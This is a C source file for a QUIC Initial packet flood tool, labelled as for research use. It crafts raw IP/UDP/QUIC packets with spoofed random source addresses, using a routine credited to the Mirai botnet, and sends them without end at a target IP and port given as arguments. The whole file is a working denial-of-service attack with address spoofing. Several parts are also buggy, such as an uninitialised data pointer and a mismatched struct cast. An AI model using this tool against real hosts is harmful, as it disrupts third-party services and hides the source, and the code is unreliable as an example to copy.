/*
Generate a QUIC Initial Packet flood

For research purposes only, please use responsibly

Author: Samuel DeLaughter
License: MIT
*/

#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>
#include <linux/if_ether.h>

#define DEBUG 1 // Set verbosity
#define DELAY 0 // Set delay between packets in seconds
#define RAND_SRC_ADDR 1 // Toggle source address randomization
#define RAND_SRC_PORT 0 // Toggle source port randomization

/*
	Maximum total packet size.  This could be larger, but packets over 1500 bytes
	may exceed some path MTUs.  Plus UDP floods tend to use very small packets in
	order to maximize per-packet overhead in the network.
*/
const uint32_t MAX_PACKET_SIZE = 1500;

// Default Source IP, in case we aren't randomizing
const char default_src_addr[32] = "127.0.0.1";

// Placeholder, destination IP must be specified with argv[1]
const char default_dst_addr[32] = "127.0.0.1";

// Default Source Port, in case we aren't randomizing
const uint16_t default_src_port = 9000;

// Destination Port, unless otherwise specified with argv[2]
const uint16_t default_dst_port = 53; // 53 is DNS

struct pseudo_header {
	uint32_t source_address;
	uint32_t dest_address;
	uint8_t placeholder;
	uint8_t protocol;
	uint16_t udp_length;
};

struct quichdr {
    uint8_t header_form : 1; // Header Form (1) = 1,
    uint8_t fixed_bit : 1;// Fixed Bit (1) = 1,
    uint8_t long_packet_type : 2;// Long Packet Type (2) = 0,
    uint8_t reserved_bits : 2; // Reserved Bits (2),
    uint8_t packet_number_len : 2; // Packet Number Length (2),
    uint32_t version;// Version (32),
    uint8_t dest_conn_id_len; // Destination Connection ID Length (8),
    uint8_t dest_conn_id; // Destination Connection ID (0..160),
    uint8_t src_conn_id_len; // Source Connection ID Length (8),
    uint8_t src_conn_id; // Source Connection ID (0..160),
    uint8_t token_len; // Token Length (i),
    // uint64_t token; // Token (..),
    uint32_t len; // Length (i),
    uint8_t packet_number; // Packet Number (8..32),
};

struct quic_crypto {
	uint8_t frame_type;
	uint8_t offset;
	uint8_t len;
	uint8_t crypto_data;
};

static void update_ip_csum(struct iphdr* iph, __be32 old_saddr) {
	// Experimental, beware
	if (old_saddr == iph->saddr){
		return;
	}
	__sum16 sum =  + (~ntohs(*(unsigned short *)&iph->saddr) & 0xffff);
	sum += ntohs(iph->check);
	sum = (sum & 0xffff) + (sum>>16);
	iph->check = htons(sum + (sum>>16) + 1);
}

static void update_udp_csum(struct iphdr* iph, struct udphdr* udph, __be32 old_saddr) {
	// Experimental, beware
	if (old_saddr == iph->saddr){
		return;
	}
	__sum16 sum =  + (~ntohs(*(unsigned short *)&iph->saddr) & 0xffff);
	sum += ntohs(udph->check);
	sum = (sum & 0xffff) + (sum>>16);
	udph->check = htons(sum + (sum>>16) + 1);
}

static uint32_t random_ipv4(void) {
	// Adapted from Mirai (https://github.com/jgamblin/Mirai-Source-Code)
	uint32_t addr;
	uint8_t o1, o2, o3, o4;

	do {
		addr = (uint32_t)(rand());
		o1 = addr & 0xff;
		o2 = (addr >> 8) & 0xff;
		o3 = (addr >> 16) & 0xff;
		o4 = (addr >> 24) & 0xff;
	}

	while (
		// Skip private and reserved addresses, and DETERLab's network
		// https://en.wikipedia.org/wiki/Reserved_IP_addresses#IPv4

		(o1 == 0) ||                              // 0.0.0.0/8        - Curreent Network
		(o1 == 10) ||                             // 10.0.0.0/8       - Private
		(o1 == 100 && o2 >= 64 && o2 < 128) ||   // 100.64.0.0/10     - Carrier grade NAT
		(o1 == 127) ||                            // 127.0.0.0/8      - Loopback
		(o1 == 169 && o2 == 254) ||               // 169.254.0.0/16   - Link-local
		(o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/12    - Private
		(o1 == 192 &&	(
			(o2 == 0 && (
				o3 == 0 || 														// 192.0.0.0/24			- Private
				o3 == 2																// 192.0.2.0/24			- Documentation
			)) ||
			(o2 == 88 && o3 == 99) ||								// 192.88.99.0/24		- Reserved
			(o2 == 168)															// 192.168.0.0/16		- Private
		)) ||
		(o1 == 198 && (
			(o2 == 18 || o2 == 19) ||								// 198.18.0.0/15		- Private
			(o2 == 51 && o3 == 100)									// 198.51.100.0/24	- Documentation
		)) ||
		(o1 == 203 && o2 == 0 && o3 == 113) ||    // 203.0.113.0/24   - Documentation
		(o1 == 206 && o2 == 117 && o3 == 25) ||		// 206.117.25.0/24	- DeterLab
		(o1 == 206 && o2 == 117 && o3 == 31) ||		// 206.117.31.0/24	- DeterLab High Performance
		(o1 >= 224)                               // 224.0.0.0+       - Various multicast/reserved
	);
	return addr;
}

static uint16_t random_port(void) {
	uint32_t port = (uint32_t)(rand()) & 0xff;
	return port;
}


// The standard function for calculating Internet checksums
unsigned short csum(unsigned short *ptr,int nbytes) {
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&oddbyte)=*(u_char*)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;

	return(answer);
}

int main(int argc, char *argv[]) {
	// Create a raw socket
	int s = socket (PF_INET, SOCK_RAW, IPPROTO_UDP);

	if(s == -1) {
		// Socket creation failed, may be because of non-root privileges
		perror("Failed to create socket, do you have root priviliges?");
		exit(1);
	}

	// Get target (and optionally source) IP address
	char dst_addr[32];
	uint16_t dst_port;

	if (argc > 1) {
		strcpy(dst_addr, argv[1]);
		if (argc > 2) {
			dst_port = (uint16_t)atoi(argv[2]);
		} else {
			dst_port = default_dst_port;
		}
	} else {
		printf("Please specify a target IP address, and optionally a port number (default destination port is 53).\nExample usage: syn_flood 127.0.0.1 80\n");
		exit(1);
	}

#if DEBUG
	printf ("Flooding target %s:%u\n", dst_addr, dst_port);

	#if RAND_SRC_ADDR
		printf("Randomizing source address\n");
	#else
		printf("Using source address %s\n", default_src_addr);
	#endif

	#if RAND_SRC_PORT
		printf("Randomizing source port\n");
	#else
		printf("Using source port %u\n", default_src_port);
	#endif
#endif


	// Seed RNG
	srand(time(NULL));

	// Byte array to hold the full packet
	char datagram[MAX_PACKET_SIZE];

	// Pointer for the packet payload
	char *data;

	// Pointer for the pseudo-header used in UDP checksum
	char *pseudogram;

	// Zero out the packet buffer
	memset (datagram, 0, MAX_PACKET_SIZE);

	// Initialize headers
	struct iphdr *iph = (struct iphdr *) datagram;
	struct udphdr *udph = (struct udphdr *) (datagram + sizeof(struct iphdr));
    struct quichdr *quich = (struct quichdr *) (datagram + sizeof(struct iphdr) + sizeof(struct udphdr));
	struct quic_crypto *crypto_frame = (struct quichdr *) (datagram + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct quichdr));
	struct pseudo_header psh;

	// UDP Payload
	// strcpy(data, "Hello, world!");

	// Address resolution
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(dst_port);
	sin.sin_addr.s_addr = inet_addr(dst_addr);

	// IP Header
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof (struct iphdr) + sizeof (struct udphdr) + strlen(data);
	iph->id = htonl(0);	//ID of this packet, can be any value
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = IPPROTO_UDP;
	iph->check = 0;		//Set to 0 before calculating checksum
	iph->saddr = inet_addr(default_src_addr);
	iph->daddr = sin.sin_addr.s_addr;

	// IP checksum
	iph->check = csum ((unsigned short *) datagram, iph->tot_len);

	// QUIC Header
    quich->header_form = 1;
    quich->fixed_bit = 1;
    quich->long_packet_type = 0;
    quich->reserved_bits = 0;
    quich->packet_number_len = 1;
    quich->version = 0;
    quich->dest_conn_id_len = 1;
    quich->dest_conn_id = 0;
    quich->src_conn_id_len = 1;
    quich->src_conn_id = 0;
    quich->token_len = 0;
    // quich. token = 0; // Token (..),
    quich->len = 1200; // Initial packets must be padded to 1200 bytes
    quich->packet_number = 0;

	crypto_frame->frame_type = 0x06;
	crypto_frame->offset = 0;
	crypto_frame->len = 1;
	crypto_frame->crypto_data = 0;

	// UDP Header
	udph->source = htons(default_src_port);
	udph->dest = sin.sin_port;
	udph->len = htons(sizeof(struct udphdr) + quich->len);
	udph->check = 0;

    
	// UDP checksum
	psh.source_address = inet_addr(default_src_addr);
	psh.dest_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_UDP;
	psh.udp_length = htons(sizeof(struct udphdr) + strlen(data));

	int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + strlen(data);
	pseudogram = malloc(psize);

	memcpy(pseudogram, (char*) &psh, sizeof (struct pseudo_header));
	memcpy(pseudogram + sizeof(struct pseudo_header), udph, sizeof(struct udphdr) + strlen(data));

	udph->check = csum((unsigned short*) pseudogram, psize);

	//IP_HDRINCL to tell the kernel that headers are included in the packet
	int option_value = 1;
	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (void *)&option_value, sizeof(option_value)) < 0) {
		perror("Error setting IP_HDRINCL");
		exit(1);
	}

	__be32 old_saddr;
	__be32 new_saddr;

	// Generate packets forever, the caller must terminate this program manually
	while(1) {
		#if RAND_SRC_ADDR || RAND_SRC_PORT
			#if RAND_SRC_ADDR
			// Generate a new random source IP, excluding certain prefixes
				new_saddr = (__be32)(random_ipv4());
			#endif

			#if RAND_SRC_PORT
				udph->source = random_port();
			#endif

			iph->check = 0;
			iph->saddr = new_saddr;
			iph->check = csum ((unsigned short *) datagram, iph->tot_len);

			udph->check = 0;
			psh.source_address = new_saddr;
			memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
			memcpy(pseudogram + sizeof(struct pseudo_header) , udph , sizeof(struct udphdr) + strlen(data));
			udph->check = csum( (unsigned short*) pseudogram , psize);
		#endif

		//Send the packet
		if (sendto (s, datagram, iph->tot_len ,	0, (struct sockaddr *) &sin, sizeof (sin)) < 0) {
			perror("Error sending packet");
		}

		#if DEBUG > 1
			printf("Sent packet from %s:%u to %s:%u\n", iph->saddr, udph->source, iph->daddr, udph->dest);
		#endif

		#if DELAY
			sleep(DELAY);
		#endif
	}

	return 0;
}
